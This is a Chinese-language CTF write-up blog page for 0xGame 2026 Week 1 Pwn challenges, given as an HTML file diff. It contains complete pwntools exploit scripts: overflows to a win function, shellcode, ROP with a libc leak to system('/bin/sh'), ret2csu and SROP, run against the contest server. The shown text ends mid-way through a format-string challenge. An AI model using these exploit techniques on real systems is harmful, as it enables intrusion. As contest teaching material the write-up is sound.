@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>haoo&#39;s tech blog - 0xGame_2026</title>
+<meta name="description" content="Week1Pwn奇妙杂货铺没有给出附件，就直接nc连接看一下 模拟了一个商铺，玩家作为买家，如果身上有99999个金币就可以获得flag，现在唯一能交互的就是选项1，花10金币买血瓶。 稍微试了一下，发现该程序并没有进行正数检测，如果输入负数，反而会增加玩家的金币，利用这一漏洞点，就可以让玩家获得无限的金币从而获取fl">
+<meta name="theme-color" content="#090c0b">
+<meta name="color-scheme" content="dark">
+<script>
+  (function () {
+    try {
+      var palette = localStorage.getItem('startrace-palette');
+      if (['green', 'cyan', 'amber'].includes(palette)) document.documentElement.dataset.palette = palette;
+    } catch (error) {}
+  })();
+</script>
+<link rel="stylesheet" href="/css/main.css">
+
+  <link rel="alternate" type="application/rss+xml" title="haoo&#39;s tech blog RSS" href="/rss.xml">
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body class="site-body">
+  
+  <header class="site-header">
+  <a class="skip-link" href="#main-content">跳到正文</a>
+  <div class="site-header__inner">
+    <a class="site-brand" href="/" aria-label="haoo&#39;s tech blog 首页">
+      <span class="site-brand__mark" aria-hidden="true">0x</span>
+      <span class="site-brand__text">
+        <strong>haoo&#39;s tech blog</strong>
+      </span>
+    </a>
+
+    <nav id="site-nav" class="site-nav" aria-label="主导航">
+      
+      
+        <a class="site-nav__link" href="/">首页</a>
+      
+        <a class="site-nav__link" href="/categories">知识库</a>
+      
+        <a class="site-nav__link" href="/tags">标签</a>
+      
+        <a class="site-nav__link" href="/about">关于</a>
+      
+        <a class="site-nav__link" href="/links">链接</a>
+      
+        <a class="site-nav__link" href="/rss.xml">RSS</a>
+      
+    </nav>
+
+    <button class="command-toggle" type="button" data-command-open aria-label="打开命令行" aria-keyshortcuts="Control+K">
+      <span aria-hidden="true">&gt;_</span>
+      <span>Console</span>
+      <kbd>Ctrl K</kbd>
+    </button>
+
+    <button class="palette-toggle" type="button" data-palette-toggle aria-label="切换主题配色" title="切换主题配色">
+      <span class="palette-toggle__swatch" aria-hidden="true"></span>
+      <span data-palette-label>绿色</span>
+    </button>
+
+    <button class="menu-toggle" type="button" aria-label="打开导航" aria-expanded="false" aria-controls="site-nav">
+      <span></span>
+      <span></span>
+      <span></span>
+    </button>
+  </div>
+  <div class="reading-progress" aria-hidden="true"><span></span></div>
+</header>
+
+
+  <main id="main-content" class="site-main article-main">
+    <article class="article-wrap">
+      <header class="article-header">
+        <div class="post-meta">
+          <span>24316 字</span>
+        </div>
+        <h1>0xGame_2026</h1>
+        
+          <div class="tag-list">
+            
+              <a class="tag-chip tag-chip--solid" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+            
+            
+              <a class="tag-chip" href="/tags/ctf/">ctf</a>
+            
+          </div>
+        
+      </header>
+
+      <div class="article-grid">
+        <div class="article-body article-prose" id="article-content">
+          <h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="奇妙杂货铺"><a href="#奇妙杂货铺" class="headerlink" title="奇妙杂货铺"></a>奇妙杂货铺</h3><p>没有给出附件，就直接nc连接看一下</p>
+<p><img src="/images/9.png"></p>
+<p>模拟了一个商铺，玩家作为买家，如果身上有99999个金币就可以获得flag，现在唯一能交互的就是选项1，花10金币买血瓶。</p>
+<p><img src="/images/10.png"></p>
+<p>稍微试了一下，发现该程序并没有进行正数检测，如果输入负数，反而会增加玩家的金币，利用这一漏洞点，就可以让玩家获得无限的金币从而获取flag了。</p>
+<p><img src="/images/11.png"></p>
+<h3 id="亦步亦趋"><a href="#亦步亦趋" class="headerlink" title="亦步亦趋"></a>亦步亦趋</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">haoo@LAPTOP-QH6DKIQF:/mnt/d/国内赛/0xGame2026/Pwn$ checksec yibuyiqu<br>[*] &#x27;/mnt/d/国内赛/0xGame2026/Pwn/yibuyiqu&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
+
+<p>开启了pie保护，因此大概率得先获得程序基址，再进行后面的操作</p>
+<p><img src="/images/12.png"></p>
+<p>首先得利用buf能够覆盖修改v2的值这一点，将v2的值改为0xdeadbeef进入level2函数</p>
+<p><img src="/images/13.png"></p>
+<p>接着在level2函数中给了我们win函数地址并存在栈溢出漏洞，可以修改返回地址</p>
+<p><img src="/images/14.png"></p>
+<p>win函数就是后门函数，那么exp就非常容易编写了，完整如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./yibuyiqu&#x27;<br>#libc_file=&#x27;libc.so.6&#x27;<br>elf=ELF(pwn_file)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;nc1.ctfplus.cn&#x27;<br>    port=39254<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s 		= 	lambda data 				: io.send(data)<br>sa 		= 	lambda delim,data 			: io.sendafter(str(delim), data)<br>sl 		= 	lambda data 				: io.sendline(data)<br>sla 	= 	lambda delim,data 			: io.sendlineafter(str(delim), data)<br>r 		= 	lambda num 					: io.recv(num)<br>rl		=	lambda 						: io.recvline()<br>ru 		= 	lambda delims, drop = True 	: io.recvuntil(delims, drop)<br>leak 	= 	lambda name,addr 			: log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 	= 	lambda data					: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 	= 	lambda data 				: u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 	= 	lambda 						: u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 	= 	lambda 						: u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>uu64    =   lambda data                 : u64(data.ljust(8,b&#x27;\x00&#x27;))<br>i32		=	lambda data					: int(io.recv(data), 16)<br>i64		=	lambda data					: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>payload_1 = cyclic(0x20 - 4) + p32(0xdeadbeef)<br>s(payload_1)<br>io.recvuntil(&quot;It&#x27;s addr about: 0x&quot;)<br>win_addr = int(io.recv(12),16)<br>leak(&quot;win_addr&quot;,win_addr)<br><br>base_addr = win_addr - 0x1209<br>ret = base_addr + 0x000000000000101a<br><br>payload_2 = cyclic(0x20 + 8) + p64(ret) + p64(win_addr)<br>sl(payload_2)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure>
+
+<h3 id="！？数学基础？！"><a href="#！？数学基础？！" class="headerlink" title="！？数学基础？！"></a>！？数学基础？！</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">==================================================<br>                   (Scripting 101)                <br>==================================================<br>系统提示：连续答对 100 道随机四则运算题，即可获得 Flag！<br>[round:1/100 ]<br>calculate: 635 一 180 = ?<br></code></pre></td></tr></table></figure>
+
+<p>就是写一个脚本进行100道四则运算，在规定时间内全部答对就能够获得flag，这里就用官方的脚本，如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>context.log_level = &#x27;debug&#x27;<br>io = remote(&#x27;nc1.ctfplus.cn&#x27;,40610)<br>#io = process(&#x27;./pwn&#x27;)<br>for i in range(100):<br>    io.recvuntil(b&#x27;calculate: &#x27;)<br>    data = io.recvuntil(b&#x27; =&#x27;)[:-2].decode(&#x27;utf-8&#x27;)<br>    if &#x27;＋&#x27; in data:<br>        data = data.replace(&#x27;＋&#x27;,&#x27;+&#x27;)<br>    if &#x27;一&#x27; in data:<br>        data = data.replace(&#x27;一&#x27;,&#x27;-&#x27;)<br>    if &#x27;x&#x27; in data:<br>        data = data.replace(&#x27;x&#x27;,&#x27;*&#x27;)<br>    if &#x27;÷&#x27; in data:<br>        data = data.replace(&#x27;÷&#x27;,&#x27;//&#x27;)<br>    ans = str(eval(data)).encode()<br>    io.recvuntil(b&#x27;answer: &#x27;)<br>    io.sendline(ans)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h3 id="两次回响"><a href="#两次回响" class="headerlink" title="两次回响"></a>两次回响</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[*] &#x27;/mnt/d/国内赛/0xGame2026/Pwn/liangcihuixiang&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      No canary found<br>    NX:         NX unknown - GNU_STACK missing<br>    PIE:        PIE enabled<br>    Stack:      Executable<br>    RWX:        Has RWX segments<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
+
+<p>这种保护，感觉是打shellcode</p>
+<p><img src="/images/15.png"></p>
+<p>确实是打shellcode，因为这道题目第一次输入的大小有限，因此得先利用这9字节构造出read，再输入shellcode并执行</p>
+<p><img src="/images/16.png"></p>
+<p>看起来是够用的，其实在本地里面直接syscall就行了，但是远程的话得弄一下rdx的值，然后毕竟是输入到rsi所指向的位置，而这个位置前面部分我们已经输入了第一段shellcode，执行完毕后，此时rip指向8字节或者9字节偏移处，因此在构造第二段shellcode时得使用\x90进行补充。exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./liangcihuixiang&#x27;<br>#libc_file=&#x27;libc.so.6&#x27;<br>elf=ELF(pwn_file)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;nc1.ctfplus.cn&#x27;<br>    port=35566<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s 		= 	lambda data 				: io.send(data)<br>sa 		= 	lambda delim,data 			: io.sendafter(str(delim), data)<br>sl 		= 	lambda data 				: io.sendline(data)<br>sla 	= 	lambda delim,data 			: io.sendlineafter(str(delim), data)<br>r 		= 	lambda num 					: io.recv(num)<br>rl		=	lambda 						: io.recvline()<br>ru 		= 	lambda delims, drop = True 	: io.recvuntil(delims, drop)<br>leak 	= 	lambda name,addr 			: log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 	= 	lambda data					: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 	= 	lambda data 				: u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 	= 	lambda 						: u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 	= 	lambda 						: u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>uu64    =   lambda data                 : u64(data.ljust(8,b&#x27;\x00&#x27;))<br>i32		=	lambda data					: int(io.recv(data), 16)<br>i64		=	lambda data					: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>shellcode_1 = &#x27;&#x27;&#x27;<br>push 0xff<br>pop rdx<br>syscall<br>&#x27;&#x27;&#x27;<br>shellcode_1 = asm(shellcode_1)<br>sl(shellcode_1)<br>pause()<br>shellcode_2 = asm(shellcraft.sh())<br>s(b&quot;\x90&quot; * 0x10 + shellcode_2)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure>
+
+<h3 id="保持沉默"><a href="#保持沉默" class="headerlink" title="保持沉默"></a>保持沉默</h3><p>首先这道题目先介绍一下dup2(2,1)，其作用是将标准输出重定向到标准错误。</p>
+<p><img src="/images/17.png"></p>
+<p><img src="/images/18.png"></p>
+<p>这道题目有意思的点在于其先关闭了标准输出，因此如果直接利用vuln函数中的栈溢出去泄漏libc的话是没有输出的，但是我们利用栈溢出跳到put函数执行dup2(2,1)，从而就可以恢复输出了。exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./baochichenmo&#x27;<br>#libc_file=&#x27;libc.so.6&#x27;<br>elf=ELF(pwn_file)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;nc1.ctfplus.cn&#x27;<br>    port=20445<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s 		= 	lambda data 				: io.send(data)<br>sa 		= 	lambda delim,data 			: io.sendafter(str(delim), data)<br>sl 		= 	lambda data 				: io.sendline(data)<br>sla 	= 	lambda delim,data 			: io.sendlineafter(str(delim), data)<br>r 		= 	lambda num 					: io.recv(num)<br>rl		=	lambda 						: io.recvline()<br>ru 		= 	lambda delims, drop = True 	: io.recvuntil(delims, drop)<br>leak 	= 	lambda name,addr 			: log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 	= 	lambda data					: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 	= 	lambda data 				: u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 	= 	lambda 						: u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 	= 	lambda 						: u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>uu64    =   lambda data                 : u64(data.ljust(8,b&#x27;\x00&#x27;))<br>i32		=	lambda data					: int(io.recv(data), 16)<br>i64		=	lambda data					: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>pop_rdi = 0x00000000004011fe<br>pop_rsi = 0x0000000000401200<br>ret = 0x000000000040101a<br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>puts_got = elf.got[&#x27;puts&#x27;]<br>put = 0x40126A<br>vuln = 0x4012EC<br><br>payload_1 = cyclic(0x20 + 8) + p64(pop_rdi) + p64(0xDEADBEEF) + p64(pop_rsi) + p64(0x9527) + p64(put) + p64(vuln)<br>sl(payload_1)<br><br>payload_2 = cyclic(0x20 + 8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)<br>sl(payload_2)<br>puts_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>leak(&#x27;puts_addr&#x27;,puts_addr)<br><br>libc_base = puts_addr - 0x80e50<br>system_addr = libc_base + 0x50d70<br>bin_sh = libc_base + 0x1d8678<br><br>payload_3 = cyclic(0x20 + 8) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)<br>sl(payload_3)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure>
+
+<h3 id="三扇门"><a href="#三扇门" class="headerlink" title="三扇门"></a>三扇门</h3><p>这道题目考查的是ret2csu，但是有非预期，可以直接利用栈溢出返回到后门函数，exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./sanshanmen&#x27;<br>#libc_file=&#x27;libc.so.6&#x27;<br>elf=ELF(pwn_file)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;nc1.ctfplus.cn&#x27;<br>    port=45056<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s 		= 	lambda data 				: io.send(data)<br>sa 		= 	lambda delim,data 			: io.sendafter(str(delim), data)<br>sl 		= 	lambda data 				: io.sendline(data)<br>sla 	= 	lambda delim,data 			: io.sendlineafter(str(delim), data)<br>r 		= 	lambda num 					: io.recv(num)<br>rl		=	lambda 						: io.recvline()<br>ru 		= 	lambda delims, drop = True 	: io.recvuntil(delims, drop)<br>leak 	= 	lambda name,addr 			: log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 	= 	lambda data					: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 	= 	lambda data 				: u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 	= 	lambda 						: u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 	= 	lambda 						: u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>uu64    =   lambda data                 : u64(data.ljust(8,b&#x27;\x00&#x27;))<br>i32		=	lambda data					: int(io.recv(data), 16)<br>i64		=	lambda data					: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>ret = 0x000000000040101a<br>win = 0x000000000040129D<br><br>payload = cyclic(0x10 + 8) + p64(win)<br>sl(payload)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure>
+
+<p>预期的话就是利用ret2csu，exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./sanshanmen&#x27;<br>#libc_file=&#x27;libc.so.6&#x27;<br>elf=ELF(pwn_file)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;nc1.ctfplus.cn&#x27;<br>    port=45056<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s 		= 	lambda data 				: io.send(data)<br>sa 		= 	lambda delim,data 			: io.sendafter(str(delim), data)<br>sl 		= 	lambda data 				: io.sendline(data)<br>sla 	= 	lambda delim,data 			: io.sendlineafter(str(delim), data)<br>r 		= 	lambda num 					: io.recv(num)<br>rl		=	lambda 						: io.recvline()<br>ru 		= 	lambda delims, drop = True 	: io.recvuntil(delims, drop)<br>leak 	= 	lambda name,addr 			: log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 	= 	lambda data					: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 	= 	lambda data 				: u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 	= 	lambda 						: u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 	= 	lambda 						: u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>uu64    =   lambda data                 : u64(data.ljust(8,b&#x27;\x00&#x27;))<br>i32		=	lambda data					: int(io.recv(data), 16)<br>i64		=	lambda data					: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>ret = 0x000000000040101a<br>win = 0x000000000040125B<br>csu_1 = 0x000000000040138A<br>csu_2 = 0x0000000000401370<br><br>payload_1 = flat(<br>    b&#x27;a&#x27;*0x18,<br>    ret,<br>    csu_1,<br>    0, 1, 0x111, 0x222, 0x333, 0x404060,<br>    csu_2,<br>    b&#x27;a&#x27;*56<br>)<br>s(payload_1)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure>
+
+<h3 id="大道至简"><a href="#大道至简" class="headerlink" title="大道至简"></a>大道至简</h3><p>就是一道简单的SROP，关键是这题没法用read读取输入的字节数来控制rax的值，但是这题存在magic函数</p>
+<p><img src="/images/19.png"></p>
+<p>可以利用这个函数将rax的值改为15，完整exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#导入所需库<br>#--------------------------------------------------------------------------------<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>import time<br><br>#设置context<br>#--------------------------------------------------------------------------------<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])<br><br>#设置是否本地还是远程,并操作、解析相应文件<br>#--------------------------------------------------------------------------------<br>pwn_file=&#x27;./dadaozhijian&#x27;<br>#libc_file=&#x27;libc.so.6&#x27;<br>elf=ELF(pwn_file)<br>#libc=ELF(libc_file)<br>#rop=ROP(libc)<br><br>flag=0<br>if flag:<br>    io=process(pwn_file)<br>else:<br>    ip=&#x27;nc1.ctfplus.cn&#x27;<br>    port=41622<br>    io=remote(ip,port)<br><br>#设置自定义函数<br>#--------------------------------------------------------------------------------<br>#gdb调试<br>def debug():<br>    #gdb.attach(io)<br>    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)<br>    #gdb.attach(io,&#x27;b main&#x27;)<br>    pause()<br>#lambda表达式<br>s 		= 	lambda data 				: io.send(data)<br>sa 		= 	lambda delim,data 			: io.sendafter(str(delim), data)<br>sl 		= 	lambda data 				: io.sendline(data)<br>sla 	= 	lambda delim,data 			: io.sendlineafter(str(delim), data)<br>r 		= 	lambda num 					: io.recv(num)<br>rl		=	lambda 						: io.recvline()<br>ru 		= 	lambda delims, drop = True 	: io.recvuntil(delims, drop)<br>leak 	= 	lambda name,addr 			: log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))<br>ur32 	= 	lambda data					: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))<br>ur64 	= 	lambda data 				: u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))<br>uul32 	= 	lambda 						: u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))<br>uul64 	= 	lambda 						: u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>uu64    =   lambda data                 : u64(data.ljust(8,b&#x27;\x00&#x27;))<br>i32		=	lambda data					: int(io.recv(data), 16)<br>i64		=	lambda data					: int(io.recv(data), 16)<br>ioi     =   lambda                      : io.interactive()<br>#获取libc函数地址<br>def libc_func_addr(base,func):<br>    return base+libc.sym[&#x27;func&#x27;]<br>#简单的shellcode+orw<br>def shell():<br>    return asm(shellcraft.sh())<br>def orw(flag_file_name,addr,count):<br>    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))<br><br>syscall = 0x000000000040107A<br>bin_sh = 0x0000000000403033<br>magic = 0x000000000040105B<br><br>sigFrame = SigreturnFrame()<br>sigFrame.rax = 0x3b<br>sigFrame.rdi = bin_sh<br>sigFrame.rsi = 0<br>sigFrame.rdx = 0<br>sigFrame.rip = syscall<br><br>payload = cyclic(0x18) + p64(magic) + p64(syscall) + bytes(sigFrame)<br>sl(payload)<br>#连接<br>#--------------------------------------------------------------------------------<br>ioi()<br></code></pre></td></tr></table></figure>
+
+<h3 id="这怎么可以作为名字啊！"><a href="#这怎么可以作为名字啊！" class="headerlink" title="这怎么可以作为名字啊！"></a>这怎么可以作为名字啊！</h3><p>一道利用格式化字符串漏洞的题目</p>
+<p><img src="/images/20.png"></p>
+<p>这道题目明显没有栈溢出，但是有两次可以利用的格式化字符串漏洞，以及有puts(buf)这种格式，那么是不是可以先向buf中输入&#x2F;bin&#x2F;sh字符串，再利用printf将puts改为system，这么一来是不是就有了system(buf)。思路很清晰了，那么就一步一步来。</p>
+<p>首先泄漏libc。能向buf中输入的字符串数量还是比较多的，就在这里泄漏吧</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; fmtarg 0x7fffffffd3f0<br>The index of format argument : 6 (\&quot;\%5$p\&quot;)<br></code></pre></td></tr></table></figure>
+
+<p>发现我们输入的偏移为6，那么将某个函数的got表地址输入进去是不是就可以泄漏了，因为得先输入&#x2F;bin&#x2F;sh字符串，因此就在偏移为8的地方输入</p>
